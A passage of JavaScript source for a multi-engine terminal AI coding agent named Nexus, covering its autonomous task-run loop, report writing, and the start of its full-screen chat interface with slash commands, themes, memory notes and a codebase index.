    const tasks = await planGoal(engine === "hybrid" ? "claude" : engine, model, goal, memory);
    state = { goal, engine, model, tasks, started: Date.now() };
    console.log("  " + bold("Plan (" + tasks.length + " tasks):"));
    tasks.forEach((t) => console.log("    " + gray(t.id + ". ") + t.title));
    console.log("");
    fs.writeFileSync(stateFile, JSON.stringify(state, null, 2));
  }
  const save = () => { try { fs.writeFileSync(stateFile, JSON.stringify(state, null, 2)); } catch (_) {} };
  const deadline = until ? parseUntil(until) : 0, maxTries = overnight ? 3 : 1;
  while (true) {
    const t = state.tasks.find((x) => !x.done && !x.failed);
    if (!t) break;
    if (deadline && Date.now() > deadline) { console.log("  " + gray("time limit reached; pausing. Resume with:  sentinel nexus run --resume")); break; }
    console.log("  " + cyan("[" + t.id + "/" + state.tasks.length + "] ") + bold(t.title)); t.tries++;
    const ctx = "GOAL: " + state.goal + "\nDone so far: " + (state.tasks.filter((x) => x.done).map((x) => x.title).join("; ") || "(none)") + (memory ? "\nPROJECT MEMORY:\n" + memory : "");
    const taskPrompt = "Work in the current project directory. " + ctx + "\n\nComplete ONLY this task, then briefly report what you did:\nTASK: " + t.title;
    let res, usedEngine = engine;
    if (engine === "ollama") { res = await ollamaExec(model, t.title, ctx, cwd); usedEngine = "ollama"; }
    else if (engine === "hybrid") {
      // Cost-saver: do the work on the free local model first; only spend Claude if it can't finish.
      console.log("    " + gray("local model first…"));
      res = await ollamaExec(model, t.title, ctx, cwd); usedEngine = "ollama";
      const v = await verifyTask("ollama", model, state.goal, t.title, res);
      if (!v.done) { console.log("    " + gray("escalating to claude…")); res = await runEngineTask("claude", taskPrompt, cwd, true); usedEngine = "claude"; }
    }
    else { res = await runEngineTask(engine, taskPrompt, cwd, true); usedEngine = engine; }
    const verdict = await verifyTask(usedEngine, model, state.goal, t.title, res);
    if (verdict.done) { t.done = true; t.by = usedEngine; console.log("  " + green("done ") + gray(t.title) + gray("  [" + usedEngine + "]")); }
    else if (t.tries >= maxTries) { t.failed = true; console.log("  " + red("gave up ") + gray(t.title + " — " + verdict.reason)); }
    else console.log("  " + gray("not verified (" + verdict.reason + "); retrying"));
    save();
  }
  const okN = state.tasks.filter((t) => t.done).length, failN = state.tasks.filter((t) => t.failed).length;
  try { fs.writeFileSync(reportFile, "# Nexus run report\n\n- Goal: " + state.goal + "\n- Engine: " + engine + "\n- Completed: " + okN + "/" + state.tasks.length + (failN ? " (" + failN + " failed)" : "") + "\n\n## Tasks\n" + state.tasks.map((t) => "- [" + (t.done ? "x" : " ") + "] " + t.title + (t.failed ? "  (failed)" : "")).join("\n") + "\n"); } catch (_) {}
  const localN = state.tasks.filter((t) => t.by === "ollama").length, claudeN = state.tasks.filter((t) => t.by === "claude").length;
  console.log("\n  " + green("run complete: ") + okN + "/" + state.tasks.length + " tasks done" + (failN ? gray(", " + failN + " failed") : ""));
  if (engine === "hybrid") console.log("  " + gray("engine mix: ") + localN + gray(" done locally (free) · ") + claudeN + gray(" needed Claude — that's ") + Math.round(100 * localN / Math.max(1, localN + claudeN)) + gray("% off your Claude usage"));
  console.log("  " + gray("report: .nexus/report.md") + "\n");
}

// Full-screen chat TUI (alt-screen, scrolling transcript, fixed bottom input box). No deps.
// Whimsical status verbs — Claude Code's set PLUS Nexus-originals (marked below).
const FORGE = ["Accomplishing", "Actioning", "Actualizing", "Baking", "Booping", "Brewing", "Calculating", "Cerebrating", "Channelling", "Churning", "Clauding", "Coalescing", "Cogitating", "Combobulating", "Computing", "Concocting", "Conjuring", "Considering", "Cooking", "Crafting", "Creating", "Crunching", "Deliberating", "Determining", "Discombobulating", "Divining", "Doing", "Effecting", "Elucidating", "Enchanting", "Envisioning", "Finagling", "Flibbertigibbeting", "Forging", "Forming", "Frolicking", "Generating", "Germinating", "Hatching", "Herding", "Honking", "Hustling", "Ideating", "Imagining", "Incubating", "Inferring", "Jiving", "Kneading", "Manifesting", "Marinating", "Meandering", "Moseying", "Mulling", "Mustering", "Musing", "Noodling", "Percolating", "Perusing", "Philosophising", "Pondering", "Pontificating", "Processing", "Puttering", "Puzzling", "Reticulating", "Ruminating", "Scheming", "Schlepping", "Shimmying", "Shucking", "Simmering", "Smooshing", "Spelunking", "Spinning", "Stewing", "Sussing", "Synthesizing", "Thinking", "Tinkering", "Transmuting", "Unfurling", "Vibing", "Wandering", "Whirring", "Wibbling", "Wizarding", "Working", "Wrangling",
  // Nexus-original verbs (built from scratch):
  "Nexusing", "Nebulizing", "Weaving", "Orchestrating", "Constellating", "Tessellating", "Kindling", "Untangling", "Refracting", "Distilling", "Alchemizing", "Threading", "Warping", "Grokking", "Percussing", "Lucubrating", "Quantizing", "Foraging", "Splicing", "Braiding", "Zhuzhing", "Effervescing", "Crystallizing", "Cascading"];
// Feature tips shown while a turn is running. NEXUS_TIPS are engine-agnostic (Nexus's own
// features); ENGINE_TIPS list ONLY what that specific AI actually offers — never mixed.
const NEXUS_TIPS = [
  "/undo reverts the last turn's file changes — a checkpoint is taken before each turn",
  "drop a file into your message with @path (e.g. fix @src/app.js)",
  "!cmd runs a shell command inline · #note saves a memory to .nexus/NEXUS.md",
  "scroll back with the mouse wheel or PgUp/PgDn · End jumps to the latest",
  "shift+tab cycles mode · ctrl+o expands tool detail · ctrl+c stops a turn",
  "/budget 5 caps your spend · /compact shrinks the context when it fills up",
  "type / to see every command · /engine switches which AI runs",
];
const { ENGINES, ENGINE_ORDER, engineCap, ENGINE_TIPS } = require("./lib/engines"); // multi-AI registry (lib/engines.js)
const engineAvail = (e) => { const m = ENGINES[e]; if (!m) return false; return m.kind === "local" ? true : hasBin(m.bin); }; // stays here — needs hasBin
const { geminiParse, codexParse } = require("./lib/parsers"); // structured-output parsers (lib/parsers.js)
function nexusTui(engine, cwd, nexusMd) {
  return new Promise((resolve) => {
    const out = process.stdout, ESC = "\x1b";
    const cols = () => out.columns || 80, rows = () => out.rows || 24;
    const PAID = {}, CTXW = {}; for (const e of ENGINE_ORDER) { PAID[e] = ENGINES[e].paid; CTXW[e] = ENGINES[e].ctx; } // derived from the registry — never drifts
    const transcript = [{ role: "art" }, { role: "system", text: "AI coding agent  ·  " + engine + "  ·  " + cwd + "\ntype a message  ·  / for commands  ·  @file inline  ·  !cmd shell  ·  #note memory" }];
    const sess = { model: engine, ctxWindow: CTXW[engine] || 200000, ctxUsed: 0, inTok: 0, outTok: 0, cost: 0, liveOut: 0 };
    const oMsgs = nexusMd ? [{ role: "system", content: "You are Nexus, a concise expert coding assistant.\n" + nexusMd }] : [{ role: "system", content: "You are Nexus, a concise expert coding assistant." }];
    let input = "", busy = false, cont = false, busyStart = 0, busyWord = "", tick = null;
    let expanded = false, mode = 1, runningShells = 0, activeAgents = 0, scroll = 0; // mode: 0 normal, 1 auto-accept, 2 plan; scroll = lines up from bottom
    const MODES = [{ k: "normal", c: gray }, { k: "auto-accept", c: green }, { k: "plan", c: cyan }];
    const compact = { on: false, f: 0, iv: null };
    const history = []; let hIdx = -1;
    let ctl = null, costCap = 0, rate = null, warned50 = false, pasteBuf = null, notify = false, redact = false, offline = false, guard = "enforce", lean = false, effort = "", fallback = "", style = "default"; // …, lean, effort, fallback model, output style
    const READONLY_TOOLS = ["Write", "Edit", "MultiEdit", "NotebookEdit", "Bash"]; // disallowed to enforce read-only (plan mode / /bench)
    const impact = { localTurns: 0, cloudTurns: 0, localTok: 0, cloudInTok: 0, cloudOutTok: 0, cloudCost: 0, ctxSavedTok: 0, coworkSaved: 0, delegated: 0 }; // Impact Receipt tallies
    let cowork = { on: false, strong: "", weak: "", weakKind: "claude" }; // strong codes, weak does cheap work; weakKind: claude|ollama(local, free)
    const auxModel = () => (cowork.on && cowork.weakKind === "claude" && engine === "claude") ? cowork.weak : undefined; // weak CLAUDE model for aux calls
    // run a cheap job on the weak worker — a cheaper Claude model OR a free local Ollama model (ctl is the current turn's controller)
    const weakTask = async (prompt) => { if (cowork.weakKind === "ollama") { const m = cowork.weak || pickCoderModel(await ollamaTags()); return (await ollamaExec(m, prompt, "", cwd, aSignal(ctl))).output; } return (await runEngineTask("claude", prompt, cwd, true, false, null, ctl, cowork.weak)).output; };
    const weakChat = async (prompt) => { if (cowork.weakKind === "ollama") { const m = cowork.weak || pickCoderModel(await ollamaTags()); return await ollamaChat(m, [{ role: "user", content: prompt }], undefined, aSignal(ctl)); } return (await runEngineTask("claude", prompt, cwd, false, false, null, ctl, cowork.weak)).output; };
    const wantWeak = (text) => cowork.on && engine === "claude" && isMechanical(text) && (cowork.weakKind === "ollama" || shouldDelegate(Math.ceil(text.length / 4) + 800, (Math.ceil(text.length / 4) + 800) * 4, cowork.strong, cowork.weak)); // local weak is free → always delegate mechanical; claude weak → only when it pays
    const checkpoints = [], redoStack = [], pinned = new Set();       // { tree, label, ts }; pinned = sticky context files
    // interrupt controller: .stopped is polled by loops; .kids are killers (child procs / aborts) fired on ctrl+c
    const makeCtl = () => ({ stopped: false, kids: [], kill() { this.stopped = true; for (const k of this.kids.splice(0)) { try { k(); } catch (_) {} } } });
    const aSignal = (c) => { const ac = new AbortController(); if (c && c.kids) c.kids.push(() => { try { ac.abort(); } catch (_) {} }); return ac.signal; };
    const fs = require("fs"), path = require("path");
    // @path inlines a file's contents into the prompt sent to the engine (display keeps the @mention)
    const inlineAts = (t) => t.replace(/(^|\s)@(\S+)/g, (m, pre, f) => { try { const c = fs.readFileSync(path.resolve(cwd, f), "utf8"); return pre + "\n\n--- " + f + " ---\n" + c.slice(0, 12000) + "\n--- end " + f + " ---\n"; } catch (_) { return m; } });
    // !cmd runs a shell command directly (Claude-Code-style passthrough); output shown inline
    const runBang = (c) => { const dg = classifyDanger(c); if (dg.level !== "ok" && guard !== "off") transcript.push({ role: "system", text: "Sentinel: this looks destructive (" + dg.why + ") — running it because you typed it directly" }); const blk = { role: "system", text: "$ " + c + "\nrunning…" }; transcript.push(blk); busy = true; ctl = makeCtl(); scroll = 0; render(); coderShell(c, cwd).then((r) => { const o = (r.output || "").replace(/[ \t\r\n]+$/, ""); blk.text = "$ " + c + "\n" + (o || "(no output)") + (r.code ? "\n[exit " + r.code + "]" : ""); busy = false; ctl = null; render(); }); };
    // #note appends a durable memory to .nexus/NEXUS.md
    const addMemory = (line) => { try { const dir = path.join(cwd, ".nexus"); fs.mkdirSync(dir, { recursive: true }); const md = path.join(dir, "NEXUS.md"); let c = ""; try { c = fs.readFileSync(md, "utf8"); } catch (_) {} if (!/\n##\s*Notes/.test(c)) c += (c && !c.endsWith("\n") ? "\n" : "") + "\n## Notes\n"; c += "- " + line + "\n"; fs.writeFileSync(md, c); transcript.push({ role: "system", text: "remembered → .nexus/NEXUS.md: " + line }); } catch (e) { transcript.push({ role: "system", text: "could not save note: " + e.message }); } };
    // ---- ansi-aware width helpers ----
    const stripA = (s) => String(s).replace(/\x1b\[[0-9;]*m/g, "");
    const clip = (s, n) => { let o = "", v = 0; for (const part of String(s).split(/(\x1b\[[0-9;]*m)/)) { if (/^\x1b/.test(part)) { o += part; continue; } for (const ch of part) { if (v >= n) return o; o += ch; v++; } } return o; };
    const fmtK = (n) => n >= 100000 ? (n / 1000).toFixed(0) + "k" : n >= 1000 ? (n / 1000).toFixed(1) + "k" : "" + (n | 0);
    const base = (pth) => String(pth || "").split("/").pop() || String(pth || "");
    // ---- NEXUS logo (gradient) + slash-command menu ----
    // Each theme = a 6-stop logo/boot gradient + an accent hue that recolors the
    // whole UI (prompt, borders, highlights) by rebinding A.cyan, the de-facto accent.
    const THEMES = {
      aurora: { grad: ["38;5;51", "38;5;45", "38;5;81", "38;5;75", "38;5;135", "38;5;171"], accent: "38;5;51" },
      matrix: { grad: ["38;5;46", "38;5;40", "38;5;34", "38;5;28", "38;5;40", "38;5;46"], accent: "38;5;46" },
      sunset: { grad: ["38;5;226", "38;5;220", "38;5;214", "38;5;208", "38;5;202", "38;5;196"], accent: "38;5;208" },
      ocean: { grad: ["38;5;45", "38;5;39", "38;5;38", "38;5;44", "38;5;33", "38;5;27"], accent: "38;5;39" },
      violet: { grad: ["38;5;141", "38;5;135", "38;5;99", "38;5;105", "38;5;171", "38;5;177"], accent: "38;5;135" },
      mono: { grad: ["38;5;252", "38;5;248", "38;5;245", "38;5;242", "38;5;240", "38;5;238"], accent: "38;5;250" },
      ember: { grad: ["38;5;196", "38;5;202", "38;5;208", "38;5;166", "38;5;124", "38;5;160"], accent: "38;5;202" },
      rose: { grad: ["38;5;218", "38;5;213", "38;5;212", "38;5;206", "38;5;170", "38;5;177"], accent: "38;5;213" },
      gold: { grad: ["38;5;229", "38;5;227", "38;5;220", "38;5;214", "38;5;178", "38;5;136"], accent: "38;5;220" },
      ice: { grad: ["38;5;195", "38;5;159", "38;5;153", "38;5;117", "38;5;111", "38;5;153"], accent: "38;5;159" },
      forest: { grad: ["38;5;41", "38;5;35", "38;5;29", "38;5;22", "38;5;28", "38;5;34"], accent: "38;5;35" },
      neon: { grad: ["38;5;201", "38;5;165", "38;5;51", "38;5;45", "38;5;207", "38;5;99"], accent: "38;5;201" },
    };
    let GRAD = THEMES.aurora.grad;
    const applyTheme = (name) => { const t = THEMES[name]; if (!t) return false; GRAD = t.grad; A.cyan = "\x1b[" + t.accent + "m"; return true; };
    try { const st = readGlobal("state.json", {}); if (st && st.theme && THEMES[st.theme]) applyTheme(st.theme); } catch (_) {} // restore last-used theme
    const gline = (s, i) => useColor ? "\x1b[1;" + GRAD[i % GRAD.length] + "m" + s + "\x1b[0m" : s;
    const ART = [
      "  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗",
      "  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝",
      "  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗",
      "  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║",
      "  ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║",
      "  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝",
    ];
    const CMDS = [
      ["/help", "commands, input prefixes & keys"], ["/clear", "start a fresh chat"], ["/compact", "summarize & shrink the context"],
      ["/context", "show token / context usage"], ["/cost", "session token cost so far"], ["/budget", "set a spend cap in USD"],
      ["/undo", "revert the last turn's file changes"], ["/rewind", "restore a specific checkpoint (/rewind N)"], ["/checkpoints", "list undo checkpoints"],
      ["/resume", "reload the last saved session"], ["/export", "save the conversation to a markdown file"], ["/copy", "copy the last reply to the clipboard"],
      ["/status", "session engine, model, tokens & cost"], ["/doctor", "check engines & tools are available"], ["/init", "scaffold .nexus/ in this project"],
      ["/model", "pick the model — lists the engine catalog; /model <name|number>"], ["/engine", "switch AI: claude · gemini · codex · opencode · aider · ollama"], ["/commands", "list custom project commands"],
      ["/agents", "run tasks in parallel: /agents a ;; b ;; c"], ["/mcp", "list / connect MCP servers"], ["/hooks", "show configured tool hooks"],
      ["/race", "run a prompt on every engine at once"], ["/review", "second opinion from a different engine"], ["/redo", "reapply an undone change"],
      ["/secrets", "scan the repo for leaked credentials"], ["/scan", "quick TCP port scan of a host"], ["/notify", "bell + desktop alert on long turns"],
      ["/watch", "run a cmd; auto-fix & re-run until it passes"], ["/commit", "AI commit message + commit the diff"], ["/diff", "colored word-level diff · /diff <file> · /diff --staged"],
      ["/pin", "keep a file in context every turn"], ["/pins", "list pinned files"], ["/unpin", "remove a pinned file"], ["/redact", "mask secrets before cloud sends"],
      ["/ensemble", "all engines answer, then synthesize the best"], ["/settings", "all options, neatly arranged (alias /options /config)"], ["/jobs", "background commands the agent started (run_background)"], ["/loop", "autonomous goal loop: /loop [-n rounds] <goal> until GOAL-DONE"], ["/team", "multi-model workspace: architect + builder + reviewer, loops to PASS"], ["/policy", "show the enterprise security policy (org + local)"], ["/audit", "audited tool actions · /audit verify (tamper check)"], ["/bench", "speed / tokens / cost table per engine"], ["/explain", "explain the diff or a file in plain English"], ["/test", "generate & run unit tests for a file"],
      ["/index", "index the repo for local auto-context"], ["/snippet", "save / use a prompt macro"], ["/snippets", "list saved prompt macros"],
      ["/plan", "make & run an editable task checklist"], ["/git", "branch, status & recent commits"], ["/blame", "who last changed a file's lines"],
      ["/cowork", "strong model codes, weak model does cheap work"], ["/cheap", "max-savings preset (lean + low effort)"], ["/lean", "ask for minimal output (saves output tokens)"], ["/style", "output style: concise·explanatory·review·tdd·secure·teacher"], ["/effort", "claude thinking level: low|medium|high"], ["/estimate", "rough token/cost of a prompt before sending"], ["/fallback", "auto-switch model on rate-limit"],
      ["/guard", "preflight destructive commands (enforce|warn|off)"], ["/impact", "session savings (tokens & cost avoided)"], ["/models", "list cloud & local models"], ["/recent", "recently changed files"], ["/keys", "keyboard shortcuts"], ["/docs", "built-in documentation (/docs <topic>)"], ["/gaps", "list TODO/FIXME markers · /gaps plan"], ["/dream", "consolidate the session into NEXUS.md memory"],
      ["/tree", "show the project file tree"], ["/theme", "change the color theme"], ["/offline", "local-only privacy lock"],
      ["/login", "sign in with Google or GitHub (Firebase)"], ["/logout", "sign out of Nexus"], ["/whoami", "show the signed-in account"], ["/setup", "install Ollama + pull a local model"],
      ["/expand", "toggle tool-call detail"], ["/exit", "quit Nexus"],
    ];
    // Custom project slash commands (Claude-Code / Glitch style): each .md file in
    // .nexus/commands/ or .claude/commands/ becomes /<name>; its body is the prompt,
    // with $ARGUMENTS / $1 $2… substituted from what you type after the command.
    const customCmds = {};
    for (const dir of [path.join(cwd, ".nexus", "commands"), path.join(cwd, ".claude", "commands")]) {
      try { for (const f of fs.readdirSync(dir)) { if (!/\.md$/.test(f)) continue; const nm = "/" + f.replace(/\.md$/, ""); if (customCmds[nm]) continue; const body = fs.readFileSync(path.join(dir, f), "utf8"); const desc = ((body.split("\n").find((l) => l.trim()) || "custom command").replace(/^#+\s*/, "") + " (custom)").slice(0, 52); customCmds[nm] = { body, desc }; } } catch (_) {}
    }
    const allCmds = () => CMDS.concat(Object.keys(customCmds).map((k) => [k, customCmds[k].desc]));
    // ---- MCP servers + hooks (loaded from .nexus/) ----
    const hooks = loadHooks(cwd);
    const policy = loadPolicy(cwd); // enterprise guardrails (.nexus/policy.json)
    const styleMap = allStyles(path.join(cwd, ".nexus", "styles")); // built-in + custom output styles
    const styleDir = (n) => styleMap[n] || "";
    const bgJobs = createBgJobs(); // long-running background commands (run_background/check_background)
    const policyPrompt = () => { const pp = []; if (policy.protectedPaths && policy.protectedPaths.length) pp.push("Never create, edit, move or delete these protected paths: " + policy.protectedPaths.join(", ") + "."); if (policy.deniedCommands && policy.deniedCommands.length) pp.push("Never run commands matching: " + policy.deniedCommands.join(", ") + "."); if (policy.maxFilesPerTurn) pp.push("Change at most " + policy.maxFilesPerTurn + " file(s) per turn."); if (!policy.allowNetwork) pp.push("Do not make network requests."); return pp.length ? "\n\nSECURITY POLICY (enforced — follow exactly):\n- " + pp.join("\n- ") : ""; };
    let mcpServers = []; // connected { name, call, tools } (or { name, error })
    const mcpToolList = () => mcpServers.filter((s) => !s.error).flatMap((s) => (s.tools || []).map((t) => ({ full: "mcp__" + s.name + "__" + t.name, srv: s, name: t.name, desc: t.description || "" })));
    // saved prompt macros (.nexus/snippets.json) + a lightweight local codebase index (.nexus/index.json)
    let snippets = {}; try { snippets = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "snippets.json"), "utf8")) || {}; } catch (_) {}
    const saveSnippets = () => { try { fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true }); fs.writeFileSync(path.join(cwd, ".nexus", "snippets.json"), JSON.stringify(snippets, null, 2)); } catch (_) {} };
    let plan = []; try { const pj = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "plan.json"), "utf8")); if (Array.isArray(pj)) plan = pj; } catch (_) {}
    const savePlan = () => { try { fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true }); fs.writeFileSync(path.join(cwd, ".nexus", "plan.json"), JSON.stringify(plan, null, 2)); } catch (_) {} };
    let index = null; try { const raw = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "index.json"), "utf8")); if (raw && raw.files) index = raw; } catch (_) {}
    const buildIndex = () => {
      const files = {}; const SKIP = /(^|\/)(\.git|node_modules|\.nexus|dist|build|\.cache|\.next|target|__pycache__)(\/|$)/;
      const CODE = /\.(js|jsx|ts|tsx|py|rb|go|rs|java|c|h|cpp|cc|cs|php|swift|kt|sh|css|scss|html|json|md|yml|yaml|toml)$/i;
      const walk = (d) => { let ents; try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (_) { return; } for (const e of ents) { const fp = path.join(d, e.name); if (SKIP.test(fp)) continue; if (e.isDirectory()) walk(fp); else if (CODE.test(e.name)) { try { if (fs.statSync(fp).size > 400000) continue; const txt = fs.readFileSync(fp, "utf8"); const kw = {}; for (const w of txt.toLowerCase().match(/[a-z_][a-z0-9_]{2,}/g) || []) kw[w] = (kw[w] || 0) + 1; files[path.relative(cwd, fp)] = Object.keys(kw); } catch (_) {} } if (Object.keys(files).length > 4000) return; } };
      walk(cwd); index = { files, ts: Date.now() }; try { fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true }); fs.writeFileSync(path.join(cwd, ".nexus", "index.json"), JSON.stringify(index)); } catch (_) {} return Object.keys(files).length;
    };
    // score indexed files by keyword overlap with the prompt; return the top matches (excluding pinned/@-mentioned)
    const retrieve = (text, k) => { if (!index || !index.files) return []; const q = new Set((text.toLowerCase().match(/[a-z_][a-z0-9_]{2,}/g) || []).filter((w) => w.length > 3)); if (!q.size) return []; const scored = []; for (const f of Object.keys(index.files)) { if (pinned.has(f) || text.includes("@" + f)) continue; let s = 0; for (const w of index.files[f]) if (q.has(w)) s++; if (s > 1) scored.push([f, s]); } scored.sort((a, b) => b[1] - a[1]); return scored.slice(0, k || 3).map((x) => x[0]); };
    // ---- inline markdown / command coloring ----
    const paintCode = (c) => (/(^|\s)(node|npm|npx|git|python3?|pip3?|bash|sh|cd|ls|cat|make|cargo|go|docker|curl|grep|sed|rm|mkdir|chmod|sudo)\b/.test(c) || /\s--?\w/.test(c)) ? blue(c) : mag(c);
    const colorMd = (line, inCode) => { if (inCode) return blue(line); if (/^#{1,6}\s/.test(line)) return bold(cyan(line)); let s = line.replace(/`([^`]+)`/g, (_, c) => paintCode(c)).replace(/\*\*([^*]+)\*\*/g, (_, c) => bold(c)); return s.replace(/^(\s*[-*]\s)/, (_, b) => cyan(b)); };
    const wrap = (text) => { const width = Math.max(1, cols() - 4); const res = []; for (const para of String(text).replace(/\r/g, "").split("\n")) { let s = para; if (!s.length) { res.push(""); continue; } while (s.length > width) { let w = width; const cc = s.charCodeAt(w - 1); if (cc >= 0xD800 && cc <= 0xDBFF) w = Math.max(1, w - 1); res.push(s.slice(0, w)); s = s.slice(w); } res.push(s); } return res; };
    // ---- tool-card labels (Claude-Code style) ----
    const toolLabel = (name, a) => {
      a = a || {};
      if (name === "Write") return "Write(" + base(a.file_path) + ")";
      if (name === "Edit" || name === "MultiEdit") return "Update(" + base(a.file_path) + ")";
      if (name === "NotebookEdit") return "Notebook(" + base(a.notebook_path) + ")";
      if (name === "Read") return "Read(" + base(a.file_path) + ")";
      if (name === "Bash") return "Bash(" + oneline(a.command, 40) + ")" + (a.run_in_background ? gray(" &") : "");
      if (name === "Grep") return "Grep(" + oneline(a.pattern, 30) + ")";
      if (name === "Glob") return "Glob(" + oneline(a.pattern, 30) + ")";
      if (name === "Task") return "Task(" + oneline(a.subagent_type || a.description || "agent", 30) + ")";
      if (name === "WebFetch") return "Fetch(" + oneline(a.url, 36) + ")";
      if (name === "WebSearch") return "Search(" + oneline(a.query, 34) + ")";
      if (name === "TodoWrite" || name === "TaskCreate" || name === "TaskUpdate") return "Plan(update)";
      if (String(name).startsWith("mcp__")) return String(name).replace(/^mcp__/, "").replace(/__/, ":") + "()";
      const v = Object.values(a)[0]; return name + "(" + (v != null ? oneline(String(v), 34) : "") + ")";
    };
    const resultText = (c) => { if (c == null) return ""; if (typeof c === "string") return c; if (Array.isArray(c)) return c.map((x) => (x && x.text) || (typeof x === "string" ? x : "")).join(" "); return String(c); };
    // ---- transcript block accessors ----
    const cur = () => transcript[transcript.length - 1];
    const ensureText = () => { const b = cur(); if (!b.items) b.items = []; let last = b.items[b.items.length - 1]; if (!last || last.type !== "text") { last = { type: "text", full: "", shown: 0 }; b.items.push(last); } return last; };
    // ---- render body ----
    const spin = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"];
    const bodyLines = () => {
      const L = [];
      for (const m of transcript) {
        if (m.role === "art") { const w = stripA(ART[0]).length; const wm = useColor ? "N E X U S".split("").map((ch, k) => "\x1b[1;" + GRAD[k % GRAD.length] + "m" + ch).join("") + "\x1b[0m" : "N E X U S"; L.push(""); L.push(gline("  " + "▁".repeat(Math.max(0, w - 2)), 0)); ART.forEach((ln, i) => L.push(gline(ln, i))); L.push(gline("  " + "▔".repeat(Math.max(0, w - 2)), 4)); L.push("  " + wm + gray("   the multi-engine AI coding agent   ") + mag("v" + VERSION)); L.push(""); continue; }
        if (m.role === "diff") {
          const W = cols() - 3;
          const raw = String(m.text).replace(/\r/g, "").split("\n");
          let k = 0;
          while (k < raw.length) {
            const ln = raw[k];
            if (/^diff --git /.test(ln)) { const f = ln.replace(/^diff --git a\/(\S+).*$/, "$1"); L.push(""); L.push(bold(cyan("╭─ " + clip(f, W - 3)))); k++; continue; }
            if (/^(index |new file|deleted file|similarity|rename |old mode|new mode|Binary )/.test(ln)) { L.push(dim(gray(clip(ln, W)))); k++; continue; }
            if (/^\+\+\+ |^--- /.test(ln)) { k++; continue; }          // file markers folded into the header above
            if (/^@@/.test(ln)) { L.push(bold(cyan(clip(ln, W)))); k++; continue; }
            if (/^-/.test(ln)) {
              const dels = []; while (k < raw.length && /^-/.test(raw[k]) && !/^--- /.test(raw[k])) dels.push(raw[k++]);
              const adds = []; while (k < raw.length && /^\+/.test(raw[k]) && !/^\+\+\+ /.test(raw[k])) adds.push(raw[k++]);
              if (dels.length && adds.length && dels.length === adds.length) {
                for (let p = 0; p < dels.length; p++) { const [ms, ps] = wordHi(dels[p].slice(1), adds[p].slice(1)); L.push(clip(red("-") + ms, W)); L.push(clip(green("+") + ps, W)); } // paired edit: highlight the changed words
              } else { for (const d of dels) L.push(red(clip(d, W))); for (const a of adds) L.push(green(clip(a, W))); }
              continue;
            }
            if (/^\+/.test(ln)) { L.push(green(clip(ln, W))); k++; continue; }
            L.push(dim(gray(clip(ln, W)))); k++;                        // context: dimmed so +/- pop
          }
          L.push(""); continue;
        }
        if (m.role === "plan") { const done = plan.filter((t) => t.done).length; L.push(bold(cyan("plan")) + gray("  " + done + "/" + plan.length + " done  ·  /plan run to execute")); if (!plan.length) L.push("  " + gray("(empty)")); for (let i = 0; i < plan.length; i++) { const t = plan[i]; const box = t.running ? yellow("[~]") : t.done ? green("[x]") : gray("[ ]"); for (const ln of wrap((i + 1) + ". " + t.text)) L.push("  " + box + " " + colorMd(ln, false)); } L.push(""); continue; }
        if (m.role === "system") { for (const ln of wrap(m.text)) L.push(gray(ln)); L.push(""); continue; }
        if (m.role === "user") { const w = wrap(m.text); L.push(mag("› ") + (w[0] || "")); for (let i = 1; i < w.length; i++) L.push("  " + w[i]); L.push(""); continue; }
        // nexus turn: ordered items (text + tool cards)
        L.push(cyan("● ") + (useColor ? "nexus".split("").map((ch, k) => "\x1b[1;" + GRAD[k % GRAD.length] + "m" + ch).join("") + "\x1b[0m" : "nexus") + gray("  " + engine + (cowork.on ? " +" + cowork.weak.replace(/^claude-|-\d.*$/g, "") : "")));
        for (const it of (m.items || [])) {
          if (it.type === "text") {
            const vis = it.full.slice(0, it.shown);
            let inCode = false;
            for (const ln of wrap(vis)) { if (/^```/.test(ln.trim())) { inCode = !inCode; L.push("  " + gray(ln)); continue; } L.push("  " + colorMd(ln, inCode)); }
          } else if (it.type === "thinking") {
            L.push("  " + dim(gray("● thinking" + (expanded ? ":" : " (ctrl+o to show)"))));
            if (expanded) for (const ln of wrap(it.full).slice(0, 24)) L.push("    " + dim(gray(ln)));
          } else if (it.type === "tool") {
            const dot = it.status === "run" ? yellow(spin[(Date.now() / 90 | 0) % spin.length]) : it.status === "err" ? red("●") : green("●");
            const secs = it.end ? ((it.end - it.start) / 1000).toFixed(1) + "s" : ((Date.now() - it.start) / 1000).toFixed(1) + "s";
            L.push("  " + dot + " " + bold(it.label) + gray("  " + secs));
            if (expanded && it.detail) for (const ln of wrap(stripA(it.detail)).slice(0, 6)) L.push("    " + gray("⎿ " + ln));
          }
        }
        // live status line while this turn is running
        if (busy && m === cur()) {
          const el = Math.round((Date.now() - busyStart) / 1000);
          const tok = sess.liveOut ? " · " + fmtK(sess.liveOut) + " tokens" : "";
          L.push("  " + mag(spin[(Date.now() / 90 | 0) % spin.length] + " " + busyWord + "…") + gray("  (" + el + "s" + tok + " · ctrl+c to stop)"));
          const et = ENGINE_TIPS[engine] || [], tips = [];
          for (let k = 0; k < Math.max(NEXUS_TIPS.length, et.length); k++) { if (et[k]) tips.push(et[k]); if (NEXUS_TIPS[k]) tips.push(NEXUS_TIPS[k]); } // interleave so an engine-specific tip shows first
          if (tips.length) L.push("  " + dim(gray("tip: " + tips[Math.floor(el / 4) % tips.length])));
        } else if (m.summary) {
          L.push("  " + dim(gray(m.summary)));
        }
        L.push("");
      }
      return L;
    };
    // ---- status + hint bars ----
    const statusBar = () => {
      const ctxW = sess.ctxWindow || 200000;
      const pct = Math.min(100, Math.round((sess.ctxUsed / ctxW) * 100));
      const cells = 8, fill = Math.max(0, Math.min(cells, Math.round((pct / 100) * cells)));
      const pc = pct >= 80 ? red : pct >= 50 ? yellow : cyan;
      const bar = pc("▓".repeat(fill)) + gray("░".repeat(cells - fill));
